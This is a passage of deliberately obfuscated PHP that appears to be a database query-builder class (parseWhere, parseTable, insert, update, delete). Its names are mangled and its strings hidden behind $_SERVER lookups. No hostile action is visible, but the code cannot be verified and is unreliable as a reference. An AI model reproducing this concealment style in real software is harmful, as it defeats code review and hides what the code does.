floor(mt_rand(0, count($¶×ü·ã[$à¦‚Æ‚ê[893]]) - 1)); $Ê©Äıù’ = $ÙØ÷ÁÀ…; } $ÙØ÷ÁÀ… = $Ê©Äıù’ !== -1 ? $Ê©Äıù’ : $ÙØ÷ÁÀ…; $úã£ˆğ¶ = array($à¦‚Æ‚ê[895] => isset($¶×ü·ã[$à¦‚Æ‚ê[895]][$ÙØ÷ÁÀ…]) ? $¶×ü·ã[$à¦‚Æ‚ê[895]][$ÙØ÷ÁÀ…] : $¶×ü·ã[$à¦‚Æ‚ê[895]][0], $à¦‚Æ‚ê[896] => isset($¶×ü·ã[$à¦‚Æ‚ê[896]][$ÙØ÷ÁÀ…]) ? $¶×ü·ã[$à¦‚Æ‚ê[896]][$ÙØ÷ÁÀ…] : $¶×ü·ã[$à¦‚Æ‚ê[896]][0], $à¦‚Æ‚ê[893] => isset($¶×ü·ã[$à¦‚Æ‚ê[893]][$ÙØ÷ÁÀ…]) ? $¶×ü·ã[$à¦‚Æ‚ê[893]][$ÙØ÷ÁÀ…] : $¶×ü·ã[$à¦‚Æ‚ê[893]][0], $à¦‚Æ‚ê[894] => isset($¶×ü·ã[$à¦‚Æ‚ê[894]][$ÙØ÷ÁÀ…]) ? $¶×ü·ã[$à¦‚Æ‚ê[894]][$ÙØ÷ÁÀ…] : $¶×ü·ã[$à¦‚Æ‚ê[894]][0], $à¦‚Æ‚ê[21] => isset($¶×ü·ã[$à¦‚Æ‚ê[21]][$ÙØ÷ÁÀ…]) ? $¶×ü·ã[$à¦‚Æ‚ê[21]][$ÙØ÷ÁÀ…] : $¶×ü·ã[$à¦‚Æ‚ê[21]][0], $à¦‚Æ‚ê[923] => isset($¶×ü·ã[$à¦‚Æ‚ê[923]][$ÙØ÷ÁÀ…]) ? $¶×ü·ã[$à¦‚Æ‚ê[923]][$ÙØ÷ÁÀ…] : $¶×ü·ã[$à¦‚Æ‚ê[923]][0], $à¦‚Æ‚ê[17] => isset($¶×ü·ã[$à¦‚Æ‚ê[17]][$ÙØ÷ÁÀ…]) ? $¶×ü·ã[$à¦‚Æ‚ê[17]][$ÙØ÷ÁÀ…] : $¶×ü·ã[$à¦‚Æ‚ê[17]][0]); return $this->connect($úã£ˆğ¶, $ÙØ÷ÁÀ…); } public function parseDSN($İ¦“Çˆ) { $Ô‹ƒ‘•ê =& $_SERVER[ñˆ‹ß¿÷]; if (empty($İ¦“Çˆ)) { return !1; } $÷úæÖÇ = parse_url($İ¦“Çˆ); if ($÷úæÖÇ[$Ô‹ƒ‘•ê[180]]) { $Üâ½‘ç¿ = array($Ô‹ƒ‘•ê[968] => $÷úæÖÇ[$Ô‹ƒ‘•ê[180]], $Ô‹ƒ‘•ê[895] => isset($÷úæÖÇ[$Ô‹ƒ‘•ê[600]]) ? $÷úæÖÇ[$Ô‹ƒ‘•ê[600]] : $Ô‹ƒ‘•ê[12], $Ô‹ƒ‘•ê[896] => isset($÷úæÖÇ[$Ô‹ƒ‘•ê[992]]) ? $÷úæÖÇ[$Ô‹ƒ‘•ê[992]] : $Ô‹ƒ‘•ê[12], $Ô‹ƒ‘•ê[893] => isset($÷úæÖÇ[$Ô‹ƒ‘•ê[181]]) ? $÷úæÖÇ[$Ô‹ƒ‘•ê[181]] : $Ô‹ƒ‘•ê[12], $Ô‹ƒ‘•ê[894] => isset($÷úæÖÇ[$Ô‹ƒ‘•ê[182]]) ? $÷úæÖÇ[$Ô‹ƒ‘•ê[182]] : $Ô‹ƒ‘•ê[12], $Ô‹ƒ‘•ê[21] => isset($÷úæÖÇ[$Ô‹ƒ‘•ê[84]]) ? substr($÷úæÖÇ[$Ô‹ƒ‘•ê[84]], 1) : $Ô‹ƒ‘•ê[12]); } else { preg_match($Ô‹ƒ‘•ê[993], trim($İ¦“Çˆ), $÷°ƒ¬ú); $Üâ½‘ç¿ = array($Ô‹ƒ‘•ê[968] => $÷°ƒ¬ú[1], $Ô‹ƒ‘•ê[895] => $÷°ƒ¬ú[2], $Ô‹ƒ‘•ê[896] => $÷°ƒ¬ú[3], $Ô‹ƒ‘•ê[893] => $÷°ƒ¬ú[4], $Ô‹ƒ‘•ê[894] => $÷°ƒ¬ú[5], $Ô‹ƒ‘•ê[21] => $÷°ƒ¬ú[6]); } $Üâ½‘ç¿[$Ô‹ƒ‘•ê[923]] = $Ô‹ƒ‘•ê[12]; return $Üâ½‘ç¿; } protected function debug() { $Ûøé…¦ =& $_SERVER[ñˆ‹ß¿÷]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $Ûøé…¦[994]; if (think_config($Ûøé…¦[995])) { think_status($Ûøé…¦[996]); think_trace($this->queryStr . $Ûøé…¦[997] . think_status($Ûøé…¦[24], $Ûøé…¦[996], 6) . $Ûøé…¦[998], $Ûøé…¦[12], $Ûøé…¦[999]); } } protected function parseLock($®±³¨ë = false) { $šÔùŠœ =& $_SERVER[ñˆ‹ß¿÷]; if (!$®±³¨ë) { return $šÔùŠœ[12]; } if ($šÔùŠœ[925] == $this->dbType) { return $šÔùŠœ[1000]; } return $šÔùŠœ[1001]; } protected function parseSet($Šöò™ïú) { $à¯©è¶£ =& $_SERVER[ñˆ‹ß¿÷]; foreach ($Šöò™ïú as $÷»—Ö¨‰ => $Å´—’Ò) { if (is_array($Å´—’Ò) && $à¯©è¶£[297] == $Å´—’Ò[0]) { $¾£ğÆ¯ù[] = $this->parseKey($÷»—Ö¨‰) . $à¯©è¶£[891] . $Å´—’Ò[1]; } elseif (is_scalar($Å´—’Ò) || is_null($Å´—’Ò)) { $¾£ğÆ¯ù[] = $this->parseKey($÷»—Ö¨‰) . $à¯©è¶£[891] . $this->parseValue($Å´—’Ò); } } return $à¯©è¶£[1002] . implode($à¯©è¶£[50], $¾£ğÆ¯ù); } protected function bindParam($­öŒÆñÊ, $¡™ğÚÛÓ) { $this->bind[$_SERVER[ñˆ‹ß¿÷][4] . $­öŒÆñÊ] = $¡™ğÚÛÓ; } protected function parseBind($Ÿ°‘îİ¢) { $Ÿ°‘îİ¢ = array_merge($this->bind, $Ÿ°‘îİ¢); $this->bind = array(); return $Ÿ°‘îİ¢; } function parseKey(&$èÒ§¨Û, $¨¤ğ½º = true) { if ($¨¤ğ½º) { $èÒ§¨Û = $this->parseKeyCheck($èÒ§¨Û); } return $èÒ§¨Û; } function parseKeyCheck($±‹öêĞÉ) { $òç†¦µ =& $_SERVER[ñˆ‹ß¿÷]; $±‹öêĞÉ = trim($±‹öêĞÉ); if (!preg_match($òç†¦µ[1003], $±‹öêĞÉ)) { think_exception($òç†¦µ[1004] . $±‹öêĞÉ); } return $±‹öêĞÉ; } protected function parseValue($ú¥õ÷£÷) { $ºÒå¥ŠÏ =& $_SERVER[ñˆ‹ß¿÷]; if (is_string($ú¥õ÷£÷)) { $ú¥õ÷£÷ = $ºÒå¥ŠÏ[964] . $this->escapeString($ú¥õ÷£÷) . $ºÒå¥ŠÏ[964]; } elseif (isset($ú¥õ÷£÷[0]) && is_string($ú¥õ÷£÷[0]) && strtolower($ú¥õ÷£÷[0]) == $ºÒå¥ŠÏ[297]) { $ú¥õ÷£÷ = $this->escapeString($ú¥õ÷£÷[1]); } elseif (is_array($ú¥õ÷£÷)) { $ú¥õ÷£÷ = array_map(array($this, $ºÒå¥ŠÏ[965]), $ú¥õ÷£÷); } elseif (is_bool($ú¥õ÷£÷)) { $ú¥õ÷£÷ = $ú¥õ÷£÷ ? $ºÒå¥ŠÏ[88] : $ºÒå¥ŠÏ[197]; } elseif (is_null($ú¥õ÷£÷)) { $ú¥õ÷£÷ = $ºÒå¥ŠÏ[103]; } return $ú¥õ÷£÷; } protected function parseField($±¥Ù° é) { $š™¥ûìÅ =& $_SERVER[ñˆ‹ß¿÷]; if (is_string($±¥Ù° é) && strpos($±¥Ù° é, $š™¥ûìÅ[50])) { $±¥Ù° é = explode($š™¥ûìÅ[50], $±¥Ù° é); } if (is_array($±¥Ù° é)) { $Ø°Ãº¢ = array(); foreach ($±¥Ù° é as $ÕˆÑ±çù => $¦‚º¹Ú°) { if (!is_numeric($ÕˆÑ±çù)) { $Ø°Ãº¢[] = $this->parseKey($ÕˆÑ±çù, !1) . $š™¥ûìÅ[1005] . $this->parseKey($¦‚º¹Ú°); } else { $Ø°Ãº¢[] = $this->parseKey($¦‚º¹Ú°); } } $®¼‡Ä‡æ = implode($š™¥ûìÅ[50], $Ø°Ãº¢); } elseif (is_string($±¥Ù° é) && !empty($±¥Ù° é)) { $®¼‡Ä‡æ = $±¥Ù° é; } else { $®¼‡Ä‡æ = $š™¥ûìÅ[188]; } return $®¼‡Ä‡æ; } protected function parseTable($ñ¹Ä Ù) { $¦ÒøÒ¯ =& $_SERVER[ñˆ‹ß¿÷]; if (is_array($ñ¹Ä Ù)) { $ª”ãœ“ß = array(); foreach ($ñ¹Ä Ù as $™àÔºä => $é‰ğáşÒ) { if (!is_numeric($™àÔºä)) { $ª”ãœ“ß[] = $this->parseKey($™àÔºä) . $¦ÒøÒ¯[53] . $this->parseKey($é‰ğáşÒ); } else { $ª”ãœ“ß[] = $this->parseKey($™àÔºä); } } $ñ¹Ä Ù = $ª”ãœ“ß; } elseif (is_string($ñ¹Ä Ù)) { if (strstr($ñ¹Ä Ù, $¦ÒøÒ¯[53])) { return $ñ¹Ä Ù; } $ñ¹Ä Ù = explode($¦ÒøÒ¯[50], $ñ¹Ä Ù); array_walk($ñ¹Ä Ù, array($this, $¦ÒøÒ¯[913])); } return $¦ÒøÒ¯[907] . trim(implode($¦ÒøÒ¯[1006], $ñ¹Ä Ù), $¦ÒøÒ¯[385]) . $¦ÒøÒ¯[907]; } protected function parseWhere($Ô®’üºÉ) { $ıÛÒÉş =& $_SERVER[ñˆ‹ß¿÷]; $Ó“Ä¼‹ = $ıÛÒÉş[12]; if (is_string($Ô®’üºÉ)) { $Ó“Ä¼‹ = $Ô®’üºÉ; } else { $×¦™•À» = isset($Ô®’üºÉ[$ıÛÒÉş[1007]]) ? strtoupper($Ô®’üºÉ[$ıÛÒÉş[1007]]) : $ıÛÒÉş[12]; if (in_array($×¦™•À», array($ıÛÒÉş[1008], $ıÛÒÉş[1009], $ıÛÒÉş[1010]))) { $×¦™•À» = $ıÛÒÉş[53] . $×¦™•À» . $ıÛÒÉş[53]; unset($Ô®’üºÉ[$ıÛÒÉş[1007]]); } else { $×¦™•À» = $ıÛÒÉş[1011]; } foreach ($Ô®’üºÉ as $‘Ô¿µÓ => $õ³Ö¾‰ˆ) { $Ó“Ä¼‹ .= $ıÛÒÉş[277]; if (is_numeric($‘Ô¿µÓ)) { $‘Ô¿µÓ = $ıÛÒÉş[1012]; } if (0 === strpos($‘Ô¿µÓ, $ıÛÒÉş[11])) { $Ó“Ä¼‹ .= $this->parseThinkWhere($‘Ô¿µÓ, $õ³Ö¾‰ˆ); } else { if (!preg_match($ıÛÒÉş[1013], trim($‘Ô¿µÓ))) { think_exception(think_lang($ıÛÒÉş[1014]) . $ıÛÒÉş[4] . $‘Ô¿µÓ); } $ƒ¾ıîöØ = is_array($õ³Ö¾‰ˆ) && isset($õ³Ö¾‰ˆ[$ıÛÒÉş[1015]]); $‘Ô¿µÓ = trim($‘Ô¿µÓ); if (strpos($‘Ô¿µÓ, $ıÛÒÉş[283])) { $•¼¶éíú = explode($ıÛÒÉş[283], $‘Ô¿µÓ); $ó¤Ò³‘ = array(); foreach ($•¼¶éíú as $İ‘°¶ => $­›¤‚¼“) { $‚Ú‰³­ = $ƒ¾ıîöØ ? $õ³Ö¾‰ˆ[$İ‘°¶] : $õ³Ö¾‰ˆ; $ó¤Ò³‘[] = $ıÛÒÉş[260] . $this->parseWhereItem($this->parseKey($­›¤‚¼“), $‚Ú‰³­) . $ıÛÒÉş[912]; } $Ó“Ä¼‹ .= implode($ıÛÒÉş[1016], $ó¤Ò³‘); } elseif (strpos($‘Ô¿µÓ, $ıÛÒÉş[284])) { $•¼¶éíú = explode($ıÛÒÉş[284], $‘Ô¿µÓ); $ó¤Ò³‘ = array(); foreach ($•¼¶éíú as $İ‘°¶ => $­›¤‚¼“) { $‚Ú‰³­ = $ƒ¾ıîöØ ? $õ³Ö¾‰ˆ[$İ‘°¶] : $õ³Ö¾‰ˆ; $ó¤Ò³‘[] = $ıÛÒÉş[260] . $this->parseWhereItem($this->parseKey($­›¤‚¼“), $‚Ú‰³­) . $ıÛÒÉş[912]; } $Ó“Ä¼‹ .= implode($ıÛÒÉş[1011], $ó¤Ò³‘); } else { $Ó“Ä¼‹ .= $this->parseWhereItem($this->parseKey($‘Ô¿µÓ), $õ³Ö¾‰ˆ); } } $Ó“Ä¼‹ .= $ıÛÒÉş[278] . $×¦™•À»; } $Ó“Ä¼‹ = substr($Ó“Ä¼‹, 0, -strlen($×¦™•À»)); } return empty($Ó“Ä¼‹) ? $ıÛÒÉş[12] : $ıÛÒÉş[1017] . $Ó“Ä¼‹; } protected function parseWhereItem($ôœ¬éåÇ, $¹ËÂ°Í) { $üÁœÚÒÂ =& $_SERVER[ñˆ‹ß¿÷]; $åÇıÀ¤œ = $üÁœÚÒÂ[12]; if (is_array($¹ËÂ°Í)) { if (is_string($¹ËÂ°Í[0])) { $‘“ª–Ø = strtolower($¹ËÂ°Í[0]); if (in_array($¹ËÂ°Í[0], array($üÁœÚÒÂ[891], $üÁœÚÒÂ[1018], $üÁœÚÒÂ[1019], $üÁœÚÒÂ[1020], $üÁœÚÒÂ[1021], $üÁœÚÒÂ[1022]))) { $åÇıÀ¤œ .= $ôœ¬éåÇ . $üÁœÚÒÂ[53] . $¹ËÂ°Í[0] . $üÁœÚÒÂ[53] . $this->parseValue($¹ËÂ°Í[1]); } elseif (preg_match($üÁœÚÒÂ[1023], $¹ËÂ°Í[0])) { $åÇıÀ¤œ .= $ôœ¬éåÇ . $üÁœÚÒÂ[53] . $this->exp[$‘“ª–Ø] . $üÁœÚÒÂ[53] . $this->parseValue($¹ËÂ°Í[1]); } elseif (preg_match($üÁœÚÒÂ[1024], $¹ËÂ°Í[0])) { if (is_array($¹ËÂ°Í[1])) { $ïúØß°ğ = isset($¹ËÂ°Í[2]) ? strtoupper($¹ËÂ°Í[2]) : $üÁœÚÒÂ[1009]; if (in_array($ïúØß°ğ, array($üÁœÚÒÂ[1008], $üÁœÚÒÂ[1009], $üÁœÚÒÂ[1010]))) { $ÌÎ€ÍŸ× = array(); foreach ($¹ËÂ°Í[1] as $ÊªÙŠêë) { $ÌÎ€ÍŸ×[] = $ôœ¬éåÇ . $üÁœÚÒÂ[53] . $this->exp[$‘“ª–Ø] . $üÁœÚÒÂ[53] . $this->parseValue($ÊªÙŠêë); } $åÇıÀ¤œ .= $üÁœÚÒÂ[260] . implode($üÁœÚÒÂ[53] . $ïúØß°ğ . $üÁœÚÒÂ[53], $ÌÎ€ÍŸ×) . $üÁœÚÒÂ[912]; } } else { $åÇıÀ¤œ .= $ôœ¬éåÇ . $üÁœÚÒÂ[53] . $this->exp[$‘“ª–Ø] . $üÁœÚÒÂ[53] . $this->parseValue($¹ËÂ°Í[1]); } } elseif ($üÁœÚÒÂ[297] == $‘“ª–Ø) { $åÇıÀ¤œ .= $üÁœÚÒÂ[910] . $ôœ¬éåÇ . $üÁœÚÒÂ[53] . $¹ËÂ°Í[1] . $üÁœÚÒÂ[1025]; } elseif (preg_match($üÁœÚÒÂ[1026], $¹ËÂ°Í[0])) { $åÇıÀ¤œ .= $¹ËÂ°Í[0]; } elseif (preg_match($üÁœÚÒÂ[1027], $¹ËÂ°Í[0])) { if (isset($¹ËÂ°Í[2]) && $üÁœÚÒÂ[297] == $¹ËÂ°Í[2]) { $åÇıÀ¤œ .= $ôœ¬éåÇ . $üÁœÚÒÂ[53] . $this->exp[$‘“ª–Ø] . $üÁœÚÒÂ[53] . $¹ËÂ°Í[1]; } else { if (is_string($¹ËÂ°Í[1])) { $¹ËÂ°Í[1] = explode($üÁœÚÒÂ[50], $¹ËÂ°Í[1]); } $û¶›üÉŠ = implode($üÁœÚÒÂ[50], $this->parseValue($¹ËÂ°Í[1])); $åÇıÀ¤œ .= $ôœ¬éåÇ . $üÁœÚÒÂ[53] . $this->exp[$‘“ª–Ø] . $üÁœÚÒÂ[910] . $û¶›üÉŠ . $üÁœÚÒÂ[912]; } } elseif (preg_match($üÁœÚÒÂ[1028], $¹ËÂ°Í[0])) { $ğ‚Ã´Ü = is_string($¹ËÂ°Í[1]) ? explode($üÁœÚÒÂ[50], $¹ËÂ°Í[1]) : $¹ËÂ°Í[1]; $åÇıÀ¤œ .= $üÁœÚÒÂ[910] . $ôœ¬éåÇ . $üÁœÚÒÂ[53] . $this->exp[$‘“ª–Ø] . $üÁœÚÒÂ[53] . $this->parseValue($ğ‚Ã´Ü[0]) . $üÁœÚÒÂ[1011] . $this->parseValue($ğ‚Ã´Ü[1]) . $üÁœÚÒÂ[278]; } else { think_exception(think_lang($üÁœÚÒÂ[1014]) . $üÁœÚÒÂ[4] . $¹ËÂ°Í[0]); } } else { $š›Û¯Óı = count($¹ËÂ°Í); $®¡ÉÇ£Ó = $üÁœÚÒÂ[12]; if (is_string($¹ËÂ°Í[$š›Û¯Óı - 1])) { $®¡ÉÇ£Ó = isset($¹ËÂ°Í[$š›Û¯Óı - 1]) ? strtoupper($¹ËÂ°Í[$š›Û¯Óı - 1]) : $üÁœÚÒÂ[12]; if (in_array($®¡ÉÇ£Ó, array($üÁœÚÒÂ[1008], $üÁœÚÒÂ[1009], $üÁœÚÒÂ[1010]))) { $š›Û¯Óı = $š›Û¯Óı - 1; } } else { $®¡ÉÇ£Ó = $üÁœÚÒÂ[1008]; } for ($õî»ù·” = 0; $õî»ù·” < $š›Û¯Óı; $õî»ù·”++) { $ğ‚Ã´Ü = is_array($¹ËÂ°Í[$õî»ù·”]) ? $¹ËÂ°Í[$õî»ù·”][1] : $¹ËÂ°Í[$õî»ù·”]; if ($üÁœÚÒÂ[297] == strtolower($¹ËÂ°Í[$õî»ù·”][0])) { $åÇıÀ¤œ .= $üÁœÚÒÂ[260] . $ôœ¬éåÇ . $üÁœÚÒÂ[53] . $ğ‚Ã´Ü . $üÁœÚÒÂ[1025] . $®¡ÉÇ£Ó . $üÁœÚÒÂ[53]; } else { $œéèŞòı = is_array($¹ËÂ°Í[$õî»ù·”]) ? $this->exp[strtolower($¹ËÂ°Í[$õî»ù·”][0])] : $üÁœÚÒÂ[891]; if (!$œéèŞòı && is_array($¹ËÂ°Í[$õî»ù·”]) && in_array($¹ËÂ°Í[$õî»ù·”][0], array($üÁœÚÒÂ[891], $üÁœÚÒÂ[1018], $üÁœÚÒÂ[1019], $üÁœÚÒÂ[1020], $üÁœÚÒÂ[1021], $üÁœÚÒÂ[1022]))) { $œéèŞòı = $¹ËÂ°Í[$õî»ù·”][0]; } $åÇıÀ¤œ .= $üÁœÚÒÂ[260] . $ôœ¬éåÇ . $üÁœÚÒÂ[53] . $œéèŞòı . $üÁœÚÒÂ[53] . $this->parseValue($ğ‚Ã´Ü) . $üÁœÚÒÂ[1025] . $®¡ÉÇ£Ó . $üÁœÚÒÂ[53]; } } $åÇıÀ¤œ = substr($åÇıÀ¤œ, 0, -4); } } else { $åÇıÀ¤œ .= $ôœ¬éåÇ . $üÁœÚÒÂ[1029] . $this->parseValue($¹ËÂ°Í); } return $åÇıÀ¤œ; } protected function parseThinkWhere($‹©¸Ïê®, $Ô—²½ÜÏ) { $À›Ëœé¢ =& $_SERVER[ñˆ‹ß¿÷]; $ö‹ˆÏé = $À›Ëœé¢[12]; switch ($‹©¸Ïê®) { case $À›Ëœé¢[352]: $ö‹ˆÏé = $Ô—²½ÜÏ; break; case $À›Ëœé¢[1012]: $ö‹ˆÏé = is_string($Ô—²½ÜÏ) ? $Ô—²½ÜÏ : substr($this->parseWhere($Ô—²½ÜÏ), 6); break; case $À›Ëœé¢[1030]: parse_str($Ô—²½ÜÏ, $æç¡Úê¿); if (isset($æç¡Úê¿[$À›Ëœé¢[1007]])) { $ıÕì°Š = $À›Ëœé¢[53] . strtoupper($æç¡Úê¿[$À›Ëœé¢[1007]]) . $À›Ëœé¢[53]; unset($æç¡Úê¿[$À›Ëœé¢[1007]]); } else { $ıÕì°Š = $À›Ëœé¢[1011]; } $áÊéûâğ = array(); foreach ($æç¡Úê¿ as $Õ¯§–éú => $İ„÷œÕ™) { $áÊéûâğ[] = $this->parseKey($Õ¯§–éú) . $À›Ëœé¢[1029] . $this->parseValue($İ„÷œÕ™); } $ö‹ˆÏé = implode($ıÕì°Š, $áÊéûâğ); break; } return $ö‹ˆÏé; } protected function parseLimit($†Íà¾Ÿª) { $‹„©Àîè =& $_SERVER[ñˆ‹ß¿÷]; return !empty($†Íà¾Ÿª) ? $‹„©Àîè[51] . $†Íà¾Ÿª . $‹„©Àîè[53] : $‹„©Àîè[12]; } protected function parseJoin($ğñÕÔÍ) { $§ñÓ•¼Ù =& $_SERVER[ñˆ‹ß¿÷]; $‡ÔÊÓŸ = $§ñÓ•¼Ù[12]; if (!empty($ğñÕÔÍ)) { if (is_array($ğñÕÔÍ)) { foreach ($ğñÕÔÍ as $„ß‡âó‚ => $ö¼ê›ñç) { if (!1 !== stripos($ö¼ê›ñç, $§ñÓ•¼Ù[1031])) { $‡ÔÊÓŸ .= $§ñÓ•¼Ù[53] . $ö¼ê›ñç; } else { $‡ÔÊÓŸ .= $§ñÓ•¼Ù[1032] . $ö¼ê›ñç; } } } else { $‡ÔÊÓŸ .= $§ñÓ•¼Ù[1032] . $ğñÕÔÍ; } } $‡ÔÊÓŸ = preg_replace($§ñÓ•¼Ù[1033], think_config($§ñÓ•¼Ù[937]) . $§ñÓ•¼Ù[1034], $‡ÔÊÓŸ); return $‡ÔÊÓŸ; } protected function parseOrder($£ª…Ç¥) { $ŸîÂ¾²² =& $_SERVER[ñˆ‹ß¿÷]; if (is_array($£ª…Ç¥)) { $„êáóâ = array(); foreach ($£ª…Ç¥ as $îÓñ‘˜˜ => $‘Š¢ÓÔ) { if (is_numeric($îÓñ‘˜˜)) { $„êáóâ[] = $this->parseKey($‘Š¢ÓÔ); } else { $‘Š¢ÓÔ = in_array(strtoupper(trim($‘Š¢ÓÔ)), array($ŸîÂ¾²²[1035], $ŸîÂ¾²²[1036])) ? $ŸîÂ¾²²[53] . $‘Š¢ÓÔ : $ŸîÂ¾²²[12]; if (preg_match($ŸîÂ¾²²[1037], $îÓñ‘˜˜)) { $„êáóâ[] = $this->parseKey($îÓñ‘˜˜) . $‘Š¢ÓÔ; } else { think_exception($ŸîÂ¾²²[1038] . $îÓñ‘˜˜); } } } $£ª…Ç¥ = implode($ŸîÂ¾²²[50], $„êáóâ); } return !empty($£ª…Ç¥) ? $ŸîÂ¾²²[1039] . $£ª…Ç¥ : $ŸîÂ¾²²[12]; } protected function parseGroup($¾¦‰ã¿) { $Úá¸¢¾é =& $_SERVER[ñˆ‹ß¿÷]; return !empty($¾¦‰ã¿) ? $Úá¸¢¾é[1040] . $¾¦‰ã¿ : $Úá¸¢¾é[12]; } protected function parseHaving($ÜÚĞÑĞº) { $±÷ÅÄí¹ =& $_SERVER[ñˆ‹ß¿÷]; return !empty($ÜÚĞÑĞº) ? $±÷ÅÄí¹[1041] . $ÜÚĞÑĞº : $±÷ÅÄí¹[12]; } protected function parseComment($­ Ï…Øæ) { $ÜúáÏ½Ñ =& $_SERVER[ñˆ‹ß¿÷]; return !empty($­ Ï…Øæ) ? $ÜúáÏ½Ñ[1042] . $­ Ï…Øæ . $ÜúáÏ½Ñ[1043] : $ÜúáÏ½Ñ[12]; } protected function parseDistinct($ëíğÙ™İ) { $¿úØÄ´ =& $_SERVER[ñˆ‹ß¿÷]; return !empty($ëíğÙ™İ) ? $¿úØÄ´[1044] : $¿úØÄ´[12]; } protected function parseUnion($ôéé¯•Ì) { $Ÿ‡ÁÕ±¶ =& $_SERVER[ñˆ‹ß¿÷]; if (empty($ôéé¯•Ì)) { return $Ÿ‡ÁÕ±¶[12]; } if (isset($ôéé¯•Ì[$Ÿ‡ÁÕ±¶[348]])) { $­Ã°Í€Õ = $Ÿ‡ÁÕ±¶[1045]; unset($ôéé¯•Ì[$Ÿ‡ÁÕ±¶[348]]); } else { $­Ã°Í€Õ = $Ÿ‡ÁÕ±¶[1046]; } foreach ($ôéé¯•Ì as $·áŸê…) { $İ„ÅãÒ[] = $­Ã°Í€Õ . (is_array($·áŸê…) ? $this->buildSelectSql($·áŸê…) : $·áŸê…); } return implode($Ÿ‡ÁÕ±¶[53], $İ„ÅãÒ); } public function insert($ÆÙÌ¢ƒ, $ºÕíÓˆì = array(), $ÅÃÒ—Œ” = false) { $í°Şá =& $_SERVER[ñˆ‹ß¿÷]; $“°•„™ä = $üœæ•â = array(); $this->model = $ºÕíÓˆì[$í°Şá[281]]; foreach ($ÆÙÌ¢ƒ as $€Æë¨Óâ => $ÚÊˆ»ï) { if (is_array($ÚÊˆ»ï) && $í°Şá[297] == $ÚÊˆ»ï[0]) { $üœæ•â[] = $this->parseKey($€Æë¨Óâ); $“°•„™ä[] = $ÚÊˆ»ï[1]; } elseif (is_scalar($ÚÊˆ»ï) || is_null($ÚÊˆ»ï)) { $üœæ•â[] = $this->parseKey($€Æë¨Óâ); $“°•„™ä[] = $this->parseValue($ÚÊˆ»ï); } } $ÆÏ†Ó­ = ($ÅÃÒ—Œ” ? $í°Şá[914] : $í°Şá[915]) . $í°Şá[916] . $this->parseTable($ºÕíÓˆì[$í°Şá[279]]) . $í°Şá[910] . implode($í°Şá[50], $üœæ•â) . $í°Şá[911] . implode($í°Şá[50], $“°•„™ä) . $í°Şá[912]; $ÆÏ†Ó­ .= $this->parseLock(isset($ºÕíÓˆì[$í°Şá[850]]) ? $ºÕíÓˆì[$í°Şá[850]] : !1); $ÆÏ†Ó­ .= $this->parseComment(!empty($ºÕíÓˆì[$í°Şá[354]]) ? $ºÕíÓˆì[$í°Şá[354]] : $í°Şá[12]); return $this->execute($ÆÏ†Ó­, $this->parseBind(!empty($ºÕíÓˆì[$í°Şá[285]]) ? $ºÕíÓˆì[$í°Şá[285]] : array())); } public function selectInsert($Ø˜¼œÖÍ, $´êÃéÆ“, $Ù¡…  = array()) { $Ï¸£ØŞ… =& $_SERVER[ñˆ‹ß¿÷]; $this->model = $Ù¡… [$Ï¸£ØŞ…[281]]; if (is_string($Ø˜¼œÖÍ)) { $Ø˜¼œÖÍ = explode($Ï¸£ØŞ…[50], $Ø˜¼œÖÍ); } array_walk($Ø˜¼œÖÍ, array($this, $Ï¸£ØŞ…[913])); $¹ìø…ú = $Ï¸£ØŞ…[1047] . $this->parseTable($´êÃéÆ“) . $Ï¸£ØŞ…[910] . implode($Ï¸£ØŞ…[50], $Ø˜¼œÖÍ) . $Ï¸£ØŞ…[1025]; $¹ìø…ú .= $this->buildSelectSql($Ù¡… ); return $this->execute($¹ìø…ú, $this->parseBind(!empty($Ù¡… [$Ï¸£ØŞ…[285]]) ? $Ù¡… [$Ï¸£ØŞ…[285]] : array())); } public function update($Ï®•Èõº, $âÙ’’€¶) { $æÍ‰‰ŞÒ =& $_SERVER[ñˆ‹ß¿÷]; $this->model = $âÙ’’€¶[$æÍ‰‰ŞÒ[281]]; $ŸûÓâ”Ë = $æÍ‰‰ŞÒ[1048] . $this->parseTable($âÙ’’€¶[$æÍ‰‰ŞÒ[279]]) . $this->parseSet($Ï®•Èõº) . $this->parseWhere(!empty($âÙ’’€¶[$æÍ‰‰ŞÒ[275]]) ? $âÙ’’€¶[$æÍ‰‰ŞÒ[275]] : $æÍ‰‰ŞÒ[12]) . $this->parseOrder(!empty($âÙ’’€¶[$æÍ‰‰ŞÒ[365]]) ? $âÙ’’€¶[$æÍ‰‰ŞÒ[365]] : $æÍ‰‰ŞÒ[12]) . $this->parseLimit(!empty($âÙ’’€¶[$æÍ‰‰ŞÒ[292]]) ? $âÙ’’€¶[$æÍ‰‰ŞÒ[292]] : $æÍ‰‰ŞÒ[12]) . $this->parseLock(isset($âÙ’’€¶[$æÍ‰‰ŞÒ[850]]) ? $âÙ’’€¶[$æÍ‰‰ŞÒ[850]] : !1) . $this->parseComment(!empty($âÙ’’€¶[$æÍ‰‰ŞÒ[354]]) ? $âÙ’’€¶[$æÍ‰‰ŞÒ[354]] : $æÍ‰‰ŞÒ[12]); return $this->execute($ŸûÓâ”Ë, $this->parseBind(!empty($âÙ’’€¶[$æÍ‰‰ŞÒ[285]]) ? $âÙ’’€¶[$æÍ‰‰ŞÒ[285]] : array())); } public function delete($¾´À‘Ï = array()) { $¸šÚÈ¯ç =& $_SERVER[ñˆ‹ß¿÷]; $this->model = $¾´À‘Ï[$¸šÚÈ¯ç[281]]; $–Çú°€ = $¸šÚÈ¯ç[1049] . $this->parseTable($¾´À‘Ï[$¸šÚÈ¯ç[279]]) . $this->parseWhere(!empty($¾´À‘Ï[$¸šÚÈ¯ç[275]]) ? $¾´À‘Ï[$¸šÚÈ¯ç[275]] : $¸šÚÈ¯ç[12]) . $this->parseOrder(!empty($¾´À‘Ï[$¸šÚÈ¯ç[365]]) ? $¾´À‘Ï[$¸šÚÈ¯ç[365]] : $¸šÚÈ¯ç[12]) . $this->parseLimit(!empty($¾´À‘Ï[$¸šÚÈ¯ç[292]]) ? $¾´À‘Ï[$¸šÚÈ¯ç[292]] : $¸šÚÈ¯ç[12]) . $this->parseLock(isset($¾´À‘Ï[$¸šÚÈ¯ç[850]]) ? $¾´À‘Ï[$¸šÚÈ¯ç[850]] : !1) . $this->parseComment(!empty($¾´À‘Ï[$¸šÚÈ¯ç[354]]) ? $¾´À‘Ï[$¸šÚÈ¯ç[354]] : $¸šÚÈ¯ç[12]); return $this->execute($–Çú°€, $this->parseBind(!empty($¾´À‘Ï[$¸šÚÈ¯ç[285]]) ? 